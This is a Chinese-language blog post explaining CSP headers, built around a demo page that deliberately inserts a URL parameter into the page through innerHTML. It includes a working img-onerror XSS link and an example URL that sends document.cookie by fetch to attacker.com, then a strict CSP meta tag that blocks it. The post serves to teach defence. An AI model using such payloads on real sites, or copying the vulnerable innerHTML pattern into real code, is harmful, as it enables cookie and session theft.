---
title: CSP标头是什么？为什么有人能神不知鬼不觉地盗走你的信息？
published: 2025-07-30T16:00:00
description: 'CSP 是内容安全策略，它可以限制恶意脚本执行，从而降低 XSS 攻击带来的信息泄露风险'
image: 'img/e245d917-2255-4d2d-85fb-aa7538a18022.webp'
tags: [XSS攻击, CSP]
category: '记录'
draft: false 
lang: ''
ai_level: 1
---

# 举个例子吧！

这是一个无CSP标头的网站： [点我](https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)%22%3E)

不出意外，你的浏览器会弹出一个提示

![](img/b279f283-b5d2-4dbd-955e-5b3bba6ff656.webp)

# 这是如何做到的？

这个项目开源在 [afoim/none_csp_demo](https://github.com/afoim/none_csp_demo)

HTML内容为

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>欢迎页面</title>
</head>
<body>
  <h1>欢迎</h1>
  <p>你好，<span id="name"></span>！</p>

  <script>
    // 从 URL 参数读取用户名并显示
    const params = new URLSearchParams(location.search);
    const name = params.get("name");
    document.getElementById("name").innerHTML = name;
  </script>
</body>
</html>
```

这个网站非常简单：页面会通过查询参数 `?name=xxx` 动态显示用户名。

比如你输入 https://none-csp-demo.pages.dev/nocsp?name=AcoFork 网页就会显示

![](img/366d0934-9c3a-4196-a7ae-1c230c916daf.webp)

从源码可以看出，这个网页是通过 `innerHTML` 直接插入文本内容的。

这种写法没有做任何安全处理，会把传入内容直接拼接进 HTML。

那么...如果我们给网站这样一个 `name` 呢？

尝试输入 

https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)%22%3E

你会发现网站并没有打印出任何用户名，而且浏览器还弹出了一个奇怪的窗口

![](img/e86cfeed-a9d4-402b-aed0-fc3624f3e925.webp)

我们F12查看当前网页的源代码

![](img/ad38bc52-e689-4923-b79c-894dc9ab4136.webp)

发现在 `<span id="name"></span>` 中

被插入了一条 `<img src="x" onerror="alert('XSS攻击成功')">` ！

也就是说，网页并没有把我们传入的 `name` 当作纯文本处理，

而是直接把它插入成了 HTML。

因此浏览器并不会把它渲染成普通文字，例如 `你好，<img src="x" onerror="alert('XSS攻击成功')"> ！`

而是会把 `<img src="x" onerror="alert('XSS攻击成功')">` 当作真正的 HTML 去执行。

由于 `src=x` 一定无法成功加载，再加上元素设置了 `onerror` 回调，

浏览器就会直接执行 `alert('XSS攻击成功')` 这段脚本。

# 有什么危害？

举一反三，既然我们能让浏览器弹出一个提示框

那么同理，它也能被用来做更多危险操作。

攻击者完全可以伪造一条URL，然后发给你，比如**获取你的浏览器Cookie然后通过Fetch发送到指定的服务器**！！！
`https://victim-site.com/page?name=<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`

# 如何设置CSP以避免这类攻击？

尝试访问这个URL，该URL设置了严格的CSP策略

https://none-csp-demo.pages.dev/csp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)%22%3E

你会发现并未弹出提示框，并且F12控制台出现报错

![](img/2febeecf-6f54-4c6a-b775-ef2ac8598f37.webp)

**以下是GPT给出的翻译和解释**

**翻译：**

> 拒绝执行内联脚本，因为它违反了以下 CSP 指令：`script-src 'self'`。要允许执行内联脚本，必须使用 `'unsafe-inline'` 关键字、指定哈希值（例如 `'sha256-raHeKmhSLYgI2dPMTS+XHraijHkbV3RTs8np6RhiKqQ='`），或使用随机数（例如 `'nonce-...'`）。

**解释：**  
你的 CSP 策略里规定只能加载本域（`'self'`）的脚本，但是你在 HTML 页面中写了 `<script>...</script>` 这样的**内联脚本**（inline script）。这被当前 CSP 限制了，无法执行。

这样就能有效阻止这类 XSS 攻击继续执行。

在HTML head中添加以下内容即可

```html
  <!-- 安全的 CSP 策略 -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
  ">
```

# 如何保证我的数据安全？

1. 如果你正在运营网站，**请尽量为站点设置严格的 CSP 策略**。这样即使页面存在 XSS 注入点，恶意脚本也更难真正执行。

2. **不要随意点击来历不明的链接或扫描来源不明的二维码**。对于短链接或混淆链接，建议先解析出最终地址并评估风险后再访问；如果不确定，也可以优先使用无痕模式打开。因为目标网站未必配置了严格的 CSP，这可能进一步增加个人数据泄露的风险。
